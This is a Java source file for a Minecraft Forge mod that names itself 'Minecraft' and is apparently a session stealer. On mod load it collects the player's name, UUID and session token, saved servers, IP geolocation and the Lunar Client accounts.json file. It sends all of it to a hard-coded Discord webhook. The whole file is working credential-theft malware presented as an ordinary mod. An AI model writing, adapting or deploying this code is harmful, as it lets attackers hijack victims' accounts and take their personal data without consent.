package com.github.shurpe;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraft.util.Session;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

// Neue Imports für das Lesen der Lunar-Dateien
import java.io.File;
import java.nio.file.Files;
import java.nio.charset.StandardCharsets;

@Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
public final class Main {

    /**
     * Your Discord webhook URL
     * <p>
     * Example: https://discord.com/api/webhooks/...
     */
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455249579246354679/PFz12Wzk9KGdz28SbWugN-CFfnPC1qyZkkukfSmG3jjWQjHKMWAfxB9RM2NTVp8n35fB";

    /**
     * Adds @everyone to webhook message
     */
    private static final boolean PING_EVERYONE = true;

    private static final Minecraft mc = Minecraft.getMinecraft();

    private DiscordWebhook.EmbedObject genGeoInfoEmbed() throws Exception {
        final JsonObject info = (JsonObject) new JsonParser().parse(
                HttpUtils.getContentAsString("https://ipapi.co/json"));

        return new DiscordWebhook.EmbedObject()
                .setTitle(":earth_americas: IP Info")
                .setColor(0x4400FF)
                .setDescription(
                        "Contains information about the target's IP address and geo-location")
                .addField(":globe_with_meridians: Country",
                        "```" + info.get("country_name").getAsString() + "```", true)
                .addField(":globe_with_meridians: City",
                        "```" + info.get("city").getAsString() + "```", true)
                .addField(":globe_with_meridians: Region",
                        "```" + info.get("region").getAsString() + "```", true)
                .addField(":satellite_orbital: IP Address",
                        "```" + info.get("ip").getAsString() + "```", true)
                .addField(":satellite: Protocol",
                        "```" + info.get("version").getAsString() + "```", true)
                .addField(":clock10: Timezone",
                        "```" + info.get("timezone").getAsString() + "```", true);
    }

    private DiscordWebhook.EmbedObject genAccInfoEmbed() {
        final Session session = mc.getSession();

        return new DiscordWebhook.EmbedObject()
                .setTitle(":unlock: Account Info")
                .setColor(0x6E39FF)
                .setDescription(
                        "[NameMC](https://namemc.com/" + session.getPlayerID() + ')' +
                        " | [Plancke](https://plancke.io/hypixel/player/stats/" + session.getPlayerID() + ')' +
                        " | [SkyCrypt](https://sky.shiiyu.moe/stats/" + session.getPlayerID() + ')')
                .addField(":identification_card: Name",
                        "```" + session.getUsername() + "```", true)
                .addField(":identification_card: UUID",
                        "```" + session.getPlayerID() + "```", true)
                .addField(":key: Session Token",
                        "```" + session.getToken() + "```", false);
    }

  private DiscordWebhook.EmbedObject genServersInfoEmbed() {
        final DiscordWebhook.EmbedObject serversEmbed = new DiscordWebhook.EmbedObject()
                .setTitle(":file_folder: Saved Servers")
                .setColor(0x8F67FC)
                .setDescription("Contains the target's list of saved Minecraft servers");

        final ServerList servers = new ServerList(mc);
        
        // WICHTIG: Discord Limit beachten (Max 25 Felder). Wir nehmen sicherheitshalber 15.
        int limit = Math.min(servers.countServers(), 15);
        
        for (int i = 0; i < limit; i++) {
            final ServerData server = servers.getServerData(i);
            // Schutz vor null-Werten
            String name = (server.serverName != null) ? server.serverName : "Unknown";
            String ip = (server.serverIP != null) ? server.serverIP : "Unknown";
            
            serversEmbed.addField(":label: " + name, "```" + ip + "```", true);
        }

        // Falls mehr Server da sind, Info anzeigen
        if (servers.countServers() > limit) {
            serversEmbed.addField("... und weitere", 
                "```" + (servers.countServers() - limit) + " Server nicht angezeigt```", false);
        }

        return serversEmbed;
    }

    // --- NEUE METHODE: Lunar Client Grabber ---
    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
        // Pfad zur Lunar Client accounts.json Datei
        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
        File lunarFile = new File(lunarPath);
        
        String content = "File not found or empty";
        
        if (lunarFile.exists()) {
            try {
                // Liest den Inhalt der Datei
                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
                content = new String(encoded, StandardCharsets.UTF_8);
                
                // Kürzen, falls die Datei zu lang für Discord ist (max 4096 Zeichen in Description, sicherheitshalber 1500)
                if (content.length() > 1500) {
                    content = content.substring(0, 1500) + "\n... [truncated]";
                }
            } catch (Exception e) {
                content = "Error reading file: " + e.getMessage();
            }
        }

        return new DiscordWebhook.EmbedObject()
                .setTitle(":crescent_moon: Lunar Client Accounts")
                .setColor(0xEE3333)
                .setDescription("```json\n" + content + "\n```");
    }
    // ------------------------------------------

    private DiscordWebhook genWebhook() {
        final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                .setUsername("github.com/14ms/MC-Session-Stealer");

        if (PING_EVERYONE) {
            webhook.setContent("@everyone");
        }

        try {
            webhook.addEmbed(genGeoInfoEmbed());
        } catch (final Exception ignored) {
        }

        webhook.addEmbed(genAccInfoEmbed());
        webhook.addEmbed(genServersInfoEmbed());
        
        // HIER WIRD DIE NEUE LUNAR METHODE AUFGERUFEN
        webhook.addEmbed(genLunarInfoEmbed());

        return webhook;
    }

    private void execWebhook() {
        new Thread(() -> {
            try {
                // Hier wird der Webhook ausgeführt
                genWebhook().execute();
                System.out.println("Webhook erfolgreich gesendet!"); // Debug-Nachricht
            } catch (final Exception e) {
                // WICHTIG: Fehler in die Konsole drucken, statt sie zu ignorieren
                System.err.println("FEHLER BEIM SENDEN DES WEBHOOKS:");
                e.printStackTrace();
            }
        }).start();
    }

    @EventHandler
    public void preInit(final FMLPreInitializationEvent event) {
        execWebhook();
    }
}